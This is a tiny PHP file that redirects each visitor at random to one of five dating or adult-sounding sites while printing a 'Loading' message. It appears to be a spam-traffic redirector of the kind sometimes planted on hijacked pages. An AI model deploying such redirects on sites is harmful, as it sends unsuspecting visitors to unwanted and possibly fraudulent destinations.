<?php
$urls = array("freedatingstore.com",
              "sweetlonelywomen.com",
              "xlocalsingles.com",
              "clearonlinedating.com",
              "casualsexfinder.net");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

